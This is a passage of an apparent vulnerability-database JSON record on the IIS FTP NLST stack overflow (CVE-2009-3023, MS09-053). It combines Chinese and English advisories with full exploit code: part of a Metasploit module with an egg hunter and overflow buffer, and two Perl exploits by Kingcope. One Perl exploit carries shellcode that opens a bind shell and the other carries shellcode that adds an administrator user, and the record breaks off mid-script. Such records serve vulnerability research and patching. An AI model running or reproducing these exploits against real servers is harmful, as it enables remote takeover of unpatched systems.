\"\\xB8\\x55\\x55\\x52\\x55\\x35\\x55\\x55\\x55\\x55\\x40\\x81\\x38#{egg}\\x75\\xF7\\x40\\x40\\x40\\x40\\xFF\\xE0\"\n\n    # This egg hunter is necessary because of the huge set of restricted characters for directory names\n    # The best that metasploit could so was 133 bytes for an alphanum encoded egg hunter\n    # The egg hunter above was written by kcope and searches from 0x70000 forward (stack) in order\n    # to locate the real shellcode. The only change from the original hunter was to randomize the\n    # prefix used.\n\n    # Store our real shellcode on the stack\n    1.upto(5) do\n      res = send_cmd( ['SITE', egg + payload.encoded.gsub(\"\\xff\", \"\\xff\\xff\") ], true )\n    end\n\n    # Create the directory path that will be used in the overflow\n    pre = rand_text_alpha_upper(3)              # esp+0x28 points here\n    pst = rand_text_alpha_upper(210)            # limited by max path\n\n    pst[  0, hun.length]  = hun                 # egg hunter\n    pst[ 90,  4]  = [target['Patch']].pack('V') # patch smashed pointers\n    pst[ 94,  4]  = [target['Patch']].pack('V')\t# patch smashed pointers\n    pst[140, 32]  = [target['Patch']].pack('V') * 8  # patch smashed pointers\n    pst[158,  4]  = [target.ret].pack(\"V\")      # return\n    pst[182,  5]  = \"\\xe9\" + [-410].pack(\"V\")   # jmp back\n\n    # Escape each 0xff with another 0xff for FTP\n    pst = pst.gsub(\"\\xff\", \"\\xff\\xff\")\n\n    print_status(\"Creating long directory...\")\n    res   = send_cmd( ['MKD', pre+pst ], true )\n    print_status(res.strip)\n\n    srv\t  = Rex::Socket::TcpServer.create(\n      'LocalHost' => '0.0.0.0',\n      'LocalPort' =>  0,\n      'SSL'       => false,\n      'Context'   => {\n          'Msf'        => framework,\n          'MsfExploit' => self,\n      }\n    )\n\n    add_socket(srv)\n\n    begin\n\n    thr = framework.threads.spawn(\"Module(#{self.refname})-Listener\", false) { srv.accept }\n\n      prt   = srv.getsockname[2]\n      prt1  = prt / 256\n      prt2  = prt % 256\n\n      addr  = Rex::Socket.source_address(rhost).gsub(\".\", \",\") + \",#{prt1},#{prt2}\"\n\n      res   = send_cmd( ['PORT', addr ], true )\n      print_status(res.strip)\n\n      print_status(\"Trying target #{target.name}...\")\n\n      res   = send_cmd( ['NLST', pre+pst + \"*/../\" + pre + \"*/\"], true )\n      print_status(res.strip) if res\n\n      select(nil,nil,nil,2)\n\n      handler\n      disconnect\n\n    ensure\n      thr.kill\n      srv.close\n\n    end\n  end\nend\n",
            "cvss": {
                "score": 9.3,
                "vector": "AV:N/AC:M/Au:N/C:C/I:C/A:C"
            },
            "vhref": "https://vulners.com/metasploit/MSF:EXPLOIT/WINDOWS/FTP/MS09_053_FTPD_NLST"
        },
        {
            "bulletinFamily": "exploit",
            "description": "BUGTRAQ  ID: 36189\r\nCVE ID: CVE-2009-3023\r\n\r\nMicrosoft Internet\u4fe1\u606f\u670d\u52a1\uff08IIS\uff09\u662fMicrosoft Windows\u81ea\u5e26\u7684\u4e00\u4e2a\u7f51\u7edc\u4fe1\u606f\u670d\u52a1\u5668\uff0c\u5176\u4e2d\u5305\u542bHTTP\u670d\u52a1\u529f\u80fd\u3002\r\n\r\nMicrosoft IIS\u5185\u5d4c\u7684FTP\u670d\u52a1\u5668\u4e2d\u5b58\u5728\u6808\u6ea2\u51fa\u6f0f\u6d1e\u3002\u5982\u679c\u8fdc\u7a0b\u653b\u51fb\u8005\u5bf9\u5e26\u6709\u7279\u5236\u540d\u79f0\u7684\u76ee\u5f55\u53d1\u5e03\u4e86\u5305\u542b\u6709\u901a\u914d\u7b26\u7684FTP NLST\uff08NAME LIST\uff09\u547d\u4ee4\u7684\u8bdd\uff0c\u5c31\u53ef\u4ee5\u89e6\u53d1\u8fd9\u4e2a\u6ea2\u51fa\uff0c\u5bfc\u81f4\u62d2\u7edd\u670d\u52a1\u6216\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002\u4ec5\u5728\u653b\u51fb\u8005\u62e5\u6709\u5199\u8bbf\u95ee\u6743\u9650\u7684\u60c5\u51b5\u4e0b\u624d\u53ef\u4ee5\u521b\u5efa\u5e26\u6709\u7279\u6b8a\u540d\u79f0\u7684\u76ee\u5f55\u3002\n\nMicrosoft IIS 6.0\r\nMicrosoft IIS 5.1\r\nMicrosoft IIS 5.0\n\u4e34\u65f6\u89e3\u51b3\u65b9\u6cd5\uff1a\r\n\r\n\u5982\u679c\u60a8\u4e0d\u80fd\u7acb\u523b\u5b89\u88c5\u8865\u4e01\u6216\u8005\u5347\u7ea7\uff0cNSFOCUS\u5efa\u8bae\u60a8\u91c7\u53d6\u4ee5\u4e0b\u63aa\u65bd\u4ee5\u964d\u4f4e\u5a01\u80c1\uff1a\r\n\r\n* \u4fee\u6539NTFS\u6587\u4ef6\u7cfb\u7edf\u6743\u9650\uff0c\u7981\u6b62FTP\u7528\u6237\u521b\u5efa\u76ee\u5f55\u3002\r\n* \u7981\u6b62\u4e0d\u53ef\u4fe1\u4efb\u7684\u533f\u540d\u7528\u6237\u5199\u8bbf\u95eeFTP\u3002\r\n\r\n\u5382\u5546\u8865\u4e01\uff1a\r\n\r\nMicrosoft\r\n---------\r\nMicrosoft\u5df2\u7ecf\u4e3a\u6b64\u53d1\u5e03\u4e86\u4e00\u4e2a\u5b89\u5168\u516c\u544a\uff08MS09-053\uff09\u4ee5\u53ca\u76f8\u5e94\u8865\u4e01:\r\nMS09-053\uff1aVulnerabilities in FTP Service for Internet Information Services Could Allow Remote Code Execution (975254)\r\n\u94fe\u63a5\uff1ahttp://www.microsoft.com/technet/security/Bulletin/MS09-053.mspx?pf=true",
            "modified": "2009-10-16T00:00:00",
            "published": "2009-10-16T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-12476",
            "id": "SSV:12476",
            "title": "Microsoft IIS FTPd\u670d\u52a1NLST\u547d\u4ee4\u8fdc\u7a0b\u6808\u6ea2\u51fa\u6f0f\u6d1e\uff08MS09-053\uff09",
            "type": "seebug",
            "sourceData": "\n                                                http://sebug.net/exploit/12164/\r\nhttp://sebug.net/exploit/12158/\n                              ",
            "cvss": {
                "score": 9.3,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:COMPLETE/I:COMPLETE/A:COMPLETE/"
            },
            "vhref": "https://vulners.com/seebug/SSV:12476"
        },
        {
            "bulletinFamily": "exploit",
            "description": "Added: 09/03/2009  \nCVE: [CVE-2009-3023](<http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3023>)  \nBID: [36189](<http://www.securityfocus.com/bid/36189>)  \nOSVDB: [57589](<http://www.osvdb.org/57589>)  \n\n\n### Background\n\nMicrosoft Internet Information Server (IIS) includes a web server and an FTP server. \n\n### Problem\n\nA stack overflow in the FTP server in IIS 5 and 6.0 via a crafted NLST command that uses wildcards allows remote authenticated users to execute arbitrary code in IIS 5 and to cause a denial of service in IIS 6.0. \n\n### Resolution\n\nApply the relevant Microsoft patch when it becomes available. \n\n### References\n\n<http://www.securityfocus.com/bid/36189>  \n\n\n### Limitations\n\nThe FTP site directory must be writable and a valid user account must be provided. \n\nExploit works on IIS 5.0 on Windows 2000 SP4 English. \n\n### Platforms\n\nWindows 2000  \n  \n\n",
            "modified": "2009-09-03T00:00:00",
            "published": "2009-09-03T00:00:00",
            "id": "SAINT:54344E071A068774A374DCE7F7795E80",
            "href": "http://download.saintcorporation.com/cgi-bin/exploit_info/iis_ftp_server_nlst",
            "type": "saint",
            "title": "Microsoft IIS FTP Server NLST Command Remote Overflow",
            "cvss": {
                "score": 9.3,
                "vector": "AV:N/AC:M/Au:N/C:C/I:C/A:C"
            },
            "vhref": "https://vulners.com/saint/SAINT:54344E071A068774A374DCE7F7795E80"
        },
        {
            "bulletinFamily": "exploit",
            "description": "Added: 09/03/2009  \nCVE: [CVE-2009-3023](<http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3023>)  \nBID: [36189](<http://www.securityfocus.com/bid/36189>)  \nOSVDB: [57589](<http://www.osvdb.org/57589>)  \n\n\n### Background\n\nMicrosoft Internet Information Server (IIS) includes a web server and an FTP server. \n\n### Problem\n\nA stack overflow in the FTP server in IIS 5 and 6.0 via a crafted NLST command that uses wildcards allows remote authenticated users to execute arbitrary code in IIS 5 and to cause a denial of service in IIS 6.0. \n\n### Resolution\n\nApply the relevant Microsoft patch when it becomes available. \n\n### References\n\n<http://www.securityfocus.com/bid/36189>  \n\n\n### Limitations\n\nThe FTP site directory must be writable and a valid user account must be provided. \n\nExploit works on IIS 5.0 on Windows 2000 SP4 English. \n\n### Platforms\n\nWindows 2000  \n  \n\n",
            "modified": "2009-09-03T00:00:00",
            "published": "2009-09-03T00:00:00",
            "id": "SAINT:38542AFE78DE33F6BB0AF7E6A3C90956",
            "href": "http://www.saintcorporation.com/cgi-bin/exploit_info/iis_ftp_server_nlst",
            "type": "saint",
            "title": "Microsoft IIS FTP Server NLST Command Remote Overflow",
            "cvss": {
                "score": 9.3,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:COMPLETE/I:COMPLETE/A:COMPLETE/"
            },
            "vhref": "https://vulners.com/saint/SAINT:38542AFE78DE33F6BB0AF7E6A3C90956"
        },
        {
            "bulletinFamily": "exploit",
            "description": "Added: 09/03/2009  \nCVE: [CVE-2009-3023](<http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3023>)  \nBID: [36189](<http://www.securityfocus.com/bid/36189>)  \nOSVDB: [57589](<http://www.osvdb.org/57589>)  \n\n\n### Background\n\nMicrosoft Internet Information Server (IIS) includes a web server and an FTP server. \n\n### Problem\n\nA stack overflow in the FTP server in IIS 5 and 6.0 via a crafted NLST command that uses wildcards allows remote authenticated users to execute arbitrary code in IIS 5 and to cause a denial of service in IIS 6.0. \n\n### Resolution\n\nApply the relevant Microsoft patch when it becomes available. \n\n### References\n\n<http://www.securityfocus.com/bid/36189>  \n\n\n### Limitations\n\nThe FTP site directory must be writable and a valid user account must be provided. \n\nExploit works on IIS 5.0 on Windows 2000 SP4 English. \n\n### Platforms\n\nWindows 2000  \n  \n\n",
            "modified": "2009-09-03T00:00:00",
            "published": "2009-09-03T00:00:00",
            "id": "SAINT:4EB4CF34422D02BCBF715C4ACFAC8C99",
            "href": "https://my.saintcorporation.com/cgi-bin/exploit_info/iis_ftp_server_nlst",
            "title": "Microsoft IIS FTP Server NLST Command Remote Overflow",
            "type": "saint",
            "cvss": {
                "score": 9.3,
                "vector": "AV:N/AC:M/Au:N/C:C/I:C/A:C"
            },
            "vhref": "https://vulners.com/saint/SAINT:4EB4CF34422D02BCBF715C4ACFAC8C99"
        },
        {
            "bulletinFamily": "exploit",
            "description": "BUGTRAQ  ID: 36189\r\nCVE(CAN) ID: CVE-2009-3023\r\n\r\nMicrosoft Internet\u4fe1\u606f\u670d\u52a1\uff08IIS\uff09\u662fMicrosoft Windows\u81ea\u5e26\u7684\u4e00\u4e2a\u7f51\u7edc\u4fe1\u606f\u670d\u52a1\u5668\uff0c\u5176\u4e2d\u5305\u542bHTTP\u670d\u52a1\u529f\u80fd\u3002\r\n\r\nMicrosoft IIS\u5185\u5d4c\u7684FTP\u670d\u52a1\u5668\u4e2d\u5b58\u5728\u6808\u6ea2\u51fa\u6f0f\u6d1e\u3002\u5982\u679c\u8fdc\u7a0b\u653b\u51fb\u8005\u5bf9\u5e26\u6709\u7279\u5236\u540d\u79f0\u7684\u76ee\u5f55\u53d1\u5e03\u4e86\u5305\u542b\u6709\u901a\u914d\u7b26\u7684FTP NLST\uff08NAME LIST\uff09\u547d\u4ee4\u7684\u8bdd\uff0c\u5c31\u53ef\u4ee5\u89e6\u53d1\u8fd9\u4e2a\u6ea2\u51fa\uff0c\u5bfc\u81f4\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002\u4ec5\u5728\u653b\u51fb\u8005\u62e5\u6709\u5199\u8bbf\u95ee\u6743\u9650\u7684\u60c5\u51b5\u4e0b\u624d\u53ef\u4ee5\u521b\u5efa\u5e26\u6709\u7279\u6b8a\u540d\u79f0\u7684\u76ee\u5f55\u3002\n\nMicrosoft IIS 6.0\r\nMicrosoft IIS 5.0\n\u5382\u5546\u8865\u4e01\uff1a\r\n\r\nMicrosoft\r\n---------\r\n\u76ee\u524d\u5382\u5546\u8fd8\u6ca1\u6709\u63d0\u4f9b\u8865\u4e01\u6216\u8005\u5347\u7ea7\u7a0b\u5e8f\uff0c\u6211\u4eec\u5efa\u8bae\u4f7f\u7528\u6b64\u8f6f\u4ef6\u7684\u7528\u6237\u968f\u65f6\u5173\u6ce8\u5382\u5546\u7684\u4e3b\u9875\u4ee5\u83b7\u53d6\u6700\u65b0\u7248\u672c\uff1a\r\n\r\nhttp://www.microsoft.com/technet/security/",
            "modified": "2009-09-02T00:00:00",
            "published": "2009-09-02T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-12175",
            "id": "SSV:12175",
            "title": "Microsoft IIS FTPd\u670d\u52a1NLST\u547d\u4ee4\u8fdc\u7a0b\u6808\u6ea2\u51fa\u6f0f\u6d1e",
            "type": "seebug",
            "sourceData": "\n                                                http://sebug.net/exploit/12164/\r\nhttp://sebug.net/exploit/12158/\n                              ",
            "cvss": {
                "score": 9.3,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:COMPLETE/I:COMPLETE/A:COMPLETE/"
            },
            "vhref": "https://vulners.com/seebug/SSV:12175"
        },
        {
            "bulletinFamily": "exploit",
            "description": "Microsoft IIS 5.0 FTP Server Remote Stack Overflow Exploit (win2k sp4). CVE-2009-3023. Remote exploit for windows platform",
            "modified": "2009-09-01T00:00:00",
            "published": "2009-09-01T00:00:00",
            "id": "EDB-ID:9559",
            "href": "https://www.exploit-db.com/exploits/9559/",
            "type": "exploitdb",
            "title": "Microsoft IIS 5.0 - FTP Server Remote Stack Overflow Exploit win2k sp4",
            "sourceData": "#!/usr/bin/perl\r\n# IIS 5.0 FTP Server / Remote SYSTEM exploit \r\n# Win2k SP4 targets \r\n# bug found & exploited by Kingcope, kcope2<at>googlemail.com \r\n# Affects IIS6 with stack cookie protection \r\n# Modded by muts, additional egghunter added for secondary larger payload\r\n# Might take a minute or two for the egg to be found.\r\n# Opens bind shell on port 4444\r\n\r\n# http://www.offensive-security.com/0day/msftp.pl.txt\r\n\r\nuse IO::Socket; \r\n$|=1; \r\n$sc = \"\\x89\\xe2\\xdd\\xc5\\xd9\\x72\\xf4\\x5f\\x57\\x59\\x49\\x49\\x49\\x49\\x43\" .\r\n\"\\x43\\x43\\x43\\x43\\x43\\x51\\x5a\\x56\\x54\\x58\\x33\\x30\\x56\\x58\\x34\" .\r\n\"\\x41\\x50\\x30\\x41\\x33\\x48\\x48\\x30\\x41\\x30\\x30\\x41\\x42\\x41\\x41\" .\r\n\"\\x42\\x54\\x41\\x41\\x51\\x32\\x41\\x42\\x32\\x42\\x42\\x30\\x42\\x42\\x58\" .\r\n\"\\x50\\x38\\x41\\x43\\x4a\\x4a\\x49\\x45\\x36\\x4d\\x51\\x48\\x4a\\x4b\\x4f\" .\r\n\"\\x44\\x4f\\x47\\x32\\x46\\x32\\x42\\x4a\\x43\\x32\\x46\\x38\\x48\\x4d\\x46\" .\r\n\"\\x4e\\x47\\x4c\\x45\\x55\\x51\\x4a\\x44\\x34\\x4a\\x4f\\x48\\x38\\x46\\x34\" .\r\n\"\\x50\\x30\\x46\\x50\\x50\\x57\\x4c\\x4b\\x4b\\x4a\\x4e\\x4f\\x44\\x35\\x4a\" .\r\n\"\\x4a\\x4e\\x4f\\x43\\x45\\x4b\\x57\\x4b\\x4f\\x4d\\x37\\x41\\x41\";\r\n# ./msfpayload windows/shell_bind_tcp R |  ./msfencode -e x86/shikata_ga_nai -b \"\\x00\\x0a\\x0d\"\r\n\r\n$shell=\"T00WT00W\" .\"\\xda\\xde\\xbd\\x2d\\xe7\\x9b\\x9f\\x2b\\xc9\\xb1\\x56\\xd9\\x74\\x24\\xf4\" .\r\n\"\\x5a\\x83\\xea\\xfc\\x31\\x6a\\x15\\x03\\x6a\\x15\\xcf\\x12\\x67\\x77\\x86\" .\r\n\"\\xdd\\x98\\x88\\xf8\\x54\\x7d\\xb9\\x2a\\x02\\xf5\\xe8\\xfa\\x40\\x5b\\x01\" .\r\n\"\\x71\\x04\\x48\\x92\\xf7\\x81\\x7f\\x13\\xbd\\xf7\\x4e\\xa4\\x70\\x38\\x1c\" .\r\n\"\\x66\\x13\\xc4\\x5f\\xbb\\xf3\\xf5\\xaf\\xce\\xf2\\x32\\xcd\\x21\\xa6\\xeb\" .\r\n\"\\x99\\x90\\x56\\x9f\\xdc\\x28\\x57\\x4f\\x6b\\x10\\x2f\\xea\\xac\\xe5\\x85\" .\r\n\"\\xf5\\xfc\\x56\\x92\\xbe\\xe4\\xdd\\xfc\\x1e\\x14\\x31\\x1f\\x62\\x5f\\x3e\" .\r\n\"\\xeb\\x10\\x5e\\x96\\x22\\xd8\\x50\\xd6\\xe8\\xe7\\x5c\\xdb\\xf1\\x20\\x5a\" .\r\n\"\\x04\\x84\\x5a\\x98\\xb9\\x9e\\x98\\xe2\\x65\\x2b\\x3d\\x44\\xed\\x8b\\xe5\" .\r\n\"\\x74\\x22\\x4d\\x6d\\x7a\\x8f\\x1a\\x29\\x9f\\x0e\\xcf\\x41\\x9b\\x9b\\xee\" .\r\n\"\\x85\\x2d\\xdf\\xd4\\x01\\x75\\xbb\\x75\\x13\\xd3\\x6a\\x8a\\x43\\xbb\\xd3\" .\r\n\"\\x2e\\x0f\\x2e\\x07\\x48\\x52\\x27\\xe4\\x66\\x6d\\xb7\\x62\\xf1\\x1e\\x85\" .\r\n\"\\x2d\\xa9\\x88\\xa5\\xa6\\x77\\x4e\\xc9\\x9c\\xcf\\xc0\\x34\\x1f\\x2f\\xc8\" .\r\n\"\\xf2\\x4b\\x7f\\x62\\xd2\\xf3\\x14\\x72\\xdb\\x21\\xba\\x22\\x73\\x9a\\x7a\" .\r\n\"\\x93\\x33\\x4a\\x12\\xf9\\xbb\\xb5\\x02\\x02\\x16\\xc0\\x05\\xcc\\x42\\x80\" .\r\n\"\\xe1\\x2d\\x75\\x36\\xad\\xb8\\x93\\x52\\x5d\\xed\\x0c\\xcb\\x9f\\xca\\x84\" .\r\n\"\\x6c\\xe0\\x38\\xb9\\x25\\x76\\x74\\xd7\\xf2\\x79\\x85\\xfd\\x50\\xd6\\x2d\" .\r\n\"\\x96\\x22\\x34\\xea\\x87\\x34\\x11\\x5a\\xc1\\x0c\\xf1\\x10\\xbf\\xdf\\x60\" .\r\n\"\\x24\\xea\\x88\\x01\\xb7\\x71\\x49\\x4c\\xa4\\x2d\\x1e\\x19\\x1a\\x24\\xca\" .\r\n\"\\xb7\\x05\\x9e\\xe9\\x4a\\xd3\\xd9\\xaa\\x90\\x20\\xe7\\x33\\x55\\x1c\\xc3\" .\r\n\"\\x23\\xa3\\x9d\\x4f\\x10\\x7b\\xc8\\x19\\xce\\x3d\\xa2\\xeb\\xb8\\x97\\x19\" .\r\n\"\\xa2\\x2c\\x6e\\x52\\x75\\x2b\\x6f\\xbf\\x03\\xd3\\xc1\\x16\\x52\\xeb\\xed\" .\r\n\"\\xfe\\x52\\x94\\x10\\x9f\\x9d\\x4f\\x91\\xbf\\x7f\\x5a\\xef\\x57\\x26\\x0f\" .\r\n\"\\x52\\x3a\\xd9\\xe5\\x90\\x43\\x5a\\x0c\\x68\\xb0\\x42\\x65\\x6d\\xfc\\xc4\" .\r\n\"\\x95\\x1f\\x6d\\xa1\\x99\\x8c\\x8e\\xe0\\x90\";\r\n\r\n\r\nprint \"IIS 5.0 FTPd / Remote r00t exploit by kcope V1.2\\n\"; \r\nif ($#ARGV ne 1) { \r\nprint \"usage: iiz5.pl <target> <your local ip>\\n\"; \r\nexit(0); \r\n} \r\nsrand(time()); \r\n$port = int(rand(31337-1022)) + 1025; \r\n$locip = $ARGV[1]; \r\n$locip =~ s/\\./,/gi; \r\nif (fork()) { \r\n$sock = IO::Socket::INET->new(PeerAddr => $ARGV[0], \r\n                              PeerPort => '21', \r\n                              Proto    => 'tcp'); \r\n$patch = \"\\x7E\\xF1\\xFA\\x7F\";\r\n$retaddr = \"\\x9B\\xB1\\xF4\\x77\"; # JMP ESP univ on 2 win2k platforms \r\n\r\n$v = \"KSEXY\" . $sc . \"V\" x (500-length($sc)-5); \r\n# top address of stack frame where shellcode resides, is hardcoded inside this block \r\n$findsc=\"\\xB8\\x55\\x55\\x52\\x55\\x35\\x55\\x55\\x55\\x55\\x40\\x81\\x38\\x53\" \r\n   .\"\\x45\\x58\\x59\\x75\\xF7\\x40\\x40\\x40\\x40\\xFF\\xFF\\xE0\"; \r\n\r\n# attack buffer \r\n$c = $findsc . \"C\" . ($patch x (76/4)) . $patch.$patch. \r\n   ($patch x (52/4)) .$patch.\"EEEE$retaddr\".$patch. \r\n   \"HHHHIIII\". \r\n$patch.\"JKKK\".\"\\xE9\\x63\\xFE\\xFF\\xFF\\xFF\\xFF\".\"NNNN\"; \r\n$x = <$sock>; \r\nprint $x;                             \r\nprint $sock \"USER anonimoos\\r\\n\"; \r\n$x = <$sock>; \r\nprint $x; \r\nprint $sock \"PASS $shell\\r\\n\";\r\n$x = <$sock>; \r\nprint $x; \r\nprint $sock \"USER anonimoos\\r\\n\"; \r\n$x = <$sock>; \r\nprint $x; \r\nprint $sock \"PASS $shell\\r\\n\";\r\n$x = <$sock>; \r\nprint $x; \r\n\r\nprint $sock \"USER anonymous\\r\\n\"; \r\n$x = <$sock>; \r\nprint $x; \r\nprint $sock \"PASS anonymous\\r\\n\"; \r\n$x = <$sock>; \r\nprint $x; \r\nprint $sock \"MKD w00t$port\\r\\n\"; \r\n$x = <$sock>; \r\nprint $x; \r\nprint $sock \"SITE $v\\r\\n\"; # We store shellcode in memory of process (stack) \r\n$x = <$sock>; \r\nprint $x; \r\nprint $sock \"SITE $v\\r\\n\"; \r\n$x = <$sock>; \r\nprint $x; \r\nprint $sock \"SITE $v\\r\\n\"; \r\n$x = <$sock>;\r\nprint $x; \r\nprint $sock \"SITE $v\\r\\n\"; \r\n$x = <$sock>; \r\nprint $x; \r\nprint $sock \"SITE $v\\r\\n\"; \r\n$x = <$sock>; \r\nprint $x; \r\nprint $sock \"CWD w00t$port\\r\\n\"; \r\n$x = <$sock>; \r\nprint $x; \r\nprint $sock \"MKD CCC\". \"$c\\r\\n\"; \r\n$x = <$sock>; \r\nprint $x; \r\nprint $sock \"PORT $locip,\" . int($port / 256) . \",\" . int($port % 256) . \"\\r\\n\"; \r\n$x = <$sock>; \r\nprint $x; \r\n# TRIGGER \r\nprint $sock \"NLST $c*/../C*/\\r\\n\"; \r\n$x = <$sock>; \r\nprint $x; \r\nwhile (1) {} \r\n} else { \r\nmy $servsock = IO::Socket::INET->new(LocalAddr => \"0.0.0.0\", LocalPort => $port, Proto => 'tcp', Listen => 1); \r\ndie \"Could not create socket: $!\\n\" unless $servsock; \r\nmy $new_sock = $servsock->accept(); \r\nwhile(<$new_sock>) { \r\nprint $_; \r\n} \r\nclose($servsock); \r\n} \r\n#Cheerio, \r\n# \r\n#Kingcope\r\n\r\n# milw0rm.com [2009-09-01]\r\n",
            "cvss": {
                "score": 9.3,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:COMPLETE/I:COMPLETE/A:COMPLETE/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:9559"
        },
        {
            "bulletinFamily": "exploit",
            "description": "**Name**|  iisftp_nlst  \n---|---  \n**CVE**|  CVE-2009-3023  \n**Exploit Pack**|  [CANVAS](<http://http://www.immunityinc.com/products-canvas.shtml>)  \n**Description**| IISFTP_NLST  \n**Notes**| CVE Name: CVE-2009-3023  \nVENDOR: Microsoft  \nReferences: http://lists.grok.org.uk/pipermail/full-disclosure/2009-August/070467.html  \nCVE Url: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3023  \nDate public: 08/31/09  \nCVSS: 9.0  \n\n",
            "modified": "2009-08-31T20:30:00",
            "published": "2009-08-31T20:30:00",
            "id": "IISFTP_NLST",
            "href": "http://exploitlist.immunityinc.com/home/exploitpack/CANVAS/iisftp_nlst",
            "type": "canvas",
            "title": "Immunity Canvas: IISFTP_NLST",
            "cvss": {
                "score": 9.3,
                "vector": "AV:N/AC:M/Au:N/C:C/I:C/A:C"
            },
            "vhref": "https://vulners.com/canvas/IISFTP_NLST"
        },
        {
            "bulletinFamily": "exploit",
            "description": "Microsoft IIS 5.0/6.0 FTP Server Remote Stack Overflow Exploit (win2k). CVE-2009-3023. Remote exploit for windows platform",
            "modified": "2009-08-31T00:00:00",
            "published": "2009-08-31T00:00:00",
            "id": "EDB-ID:9541",
            "href": "https://www.exploit-db.com/exploits/9541/",
            "type": "exploitdb",
            "title": "Microsoft IIS 5.0/6.0 FTP Server Remote Stack Overflow Exploit win2k",
            "sourceData": "# IIS 5.0 FTPd / Remote r00t exploit \r\n# Win2k SP4 targets \r\n# bug found & exploited by Kingcope, kcope2<at>googlemail.com \r\n# Affects IIS6 with stack cookie protection \r\n# August 2009 - KEEP THIS 0DAY PRIV8 \r\nuse IO::Socket; \r\n$|=1; \r\n#metasploit shellcode, adduser \"winown:nwoniw\" \r\n$sc = \"\\x89\\xe2\\xda\\xde\\xd9\\x72\\xf4\\x5b\\x53\\x59\\x49\\x49\\x49\\x49\" . \r\n\"\\x49\\x49\\x49\\x49\\x49\\x49\\x43\\x43\\x43\\x43\\x43\\x43\\x37\\x51\" . \r\n\"\\x5a\\x6a\\x41\\x58\\x50\\x30\\x41\\x30\\x41\\x6b\\x41\\x41\\x51\\x32\" . \r\n\"\\x41\\x42\\x32\\x42\\x42\\x30\\x42\\x42\\x41\\x42\\x58\\x50\\x38\\x41\" . \r\n\"\\x42\\x75\\x4a\\x49\\x4b\\x4c\\x4a\\x48\\x50\\x44\\x43\\x30\\x43\\x30\" . \r\n\"\\x43\\x30\\x4c\\x4b\\x47\\x35\\x47\\x4c\\x4c\\x4b\\x43\\x4c\\x45\\x55\" . \r\n\"\\x42\\x58\\x45\\x51\\x4a\\x4f\\x4c\\x4b\\x50\\x4f\\x45\\x48\\x4c\\x4b\" . \r\n\"\\x51\\x4f\\x51\\x30\\x43\\x31\\x4a\\x4b\\x47\\x39\\x4c\\x4b\\x47\\x44\" . \r\n\"\\x4c\\x4b\\x43\\x31\\x4a\\x4e\\x50\\x31\\x49\\x50\\x4c\\x59\\x4e\\x4c\" . \r\n\"\\x4c\\x44\\x49\\x50\\x44\\x34\\x43\\x37\\x49\\x51\\x49\\x5a\\x44\\x4d\" . \r\n\"\\x43\\x31\\x49\\x52\\x4a\\x4b\\x4c\\x34\\x47\\x4b\\x51\\x44\\x46\\x44\" . \r\n\"\\x43\\x34\\x43\\x45\\x4a\\x45\\x4c\\x4b\\x51\\x4f\\x51\\x34\\x43\\x31\" . \r\n\"\\x4a\\x4b\\x43\\x56\\x4c\\x4b\\x44\\x4c\\x50\\x4b\\x4c\\x4b\\x51\\x4f\" . \r\n\"\\x45\\x4c\\x45\\x51\\x4a\\x4b\\x4c\\x4b\\x45\\x4c\\x4c\\x4b\\x45\\x51\" . \r\n\"\\x4a\\x4b\\x4b\\x39\\x51\\x4c\\x46\\x44\\x44\\x44\\x48\\x43\\x51\\x4f\" . \r\n\"\\x46\\x51\\x4c\\x36\\x43\\x50\\x50\\x56\\x45\\x34\\x4c\\x4b\\x50\\x46\" . \r\n\"\\x50\\x30\\x4c\\x4b\\x47\\x30\\x44\\x4c\\x4c\\x4b\\x42\\x50\\x45\\x4c\" . \r\n\"\\x4e\\x4d\\x4c\\x4b\\x42\\x48\\x45\\x58\\x4d\\x59\\x4a\\x58\\x4c\\x43\" . \r\n\"\\x49\\x50\\x43\\x5a\\x46\\x30\\x43\\x58\\x4c\\x30\\x4c\\x4a\\x44\\x44\" .\r\n\"\\x51\\x4f\\x43\\x58\\x4a\\x38\\x4b\\x4e\\x4d\\x5a\\x44\\x4e\\x50\\x57\" . \r\n\"\\x4b\\x4f\\x4a\\x47\\x42\\x43\\x42\\x4d\\x45\\x34\\x46\\x4e\\x42\\x45\" . \r\n\"\\x44\\x38\\x43\\x55\\x47\\x50\\x46\\x4f\\x45\\x33\\x47\\x50\\x42\\x4e\" . \r\n\"\\x42\\x45\\x43\\x44\\x51\\x30\\x44\\x35\\x44\\x33\\x45\\x35\\x44\\x32\" . \r\n\"\\x51\\x30\\x43\\x47\\x43\\x59\\x42\\x4e\\x42\\x4f\\x43\\x47\\x42\\x4e\" . \r\n\"\\x51\\x30\\x42\\x4e\\x44\\x37\\x42\\x4f\\x42\\x4e\\x45\\x39\\x43\\x47\" . \r\n\"\\x47\\x50\\x46\\x4f\\x51\\x51\\x50\\x44\\x47\\x34\\x51\\x30\\x46\\x46\" . \r\n\"\\x51\\x36\\x51\\x30\\x42\\x4e\\x42\\x45\\x44\\x34\\x51\\x30\\x42\\x4c\" . \r\n\"\\x42\\x4f\\x43\\x53\\x45\\x31\\x42\\x4c\\x42\\x47\\x43\\x42\\x42\\x4f\" . \r\n\"\\x43\\x45\\x42\\x50\\x47\\x50\\x47\\x31\\x42\\x44\\x42\\x4d\\x45\\x39\" . \r\n\"\\x42\\x4e\\x42\\x49\\x42\\x53\\x43\\x44\\x43\\x42\\x45\\x31\\x44\\x34\" . \r\n\"\\x42\\x4f\\x43\\x42\\x43\\x43\\x47\\x50\\x42\\x57\\x45\\x39\\x42\\x4e\" . \r\n\"\\x42\\x4f\\x42\\x57\\x42\\x4e\\x47\\x50\\x46\\x4f\\x47\\x31\\x51\\x54\" . \r\n\"\\x51\\x54\\x43\\x30\\x41\\x41\"; \r\n#1ca \r\nprint \"IIS 5.0 FTPd / Remote r00t exploit by kcope V1.2\\n\"; \r\nif ($#ARGV ne 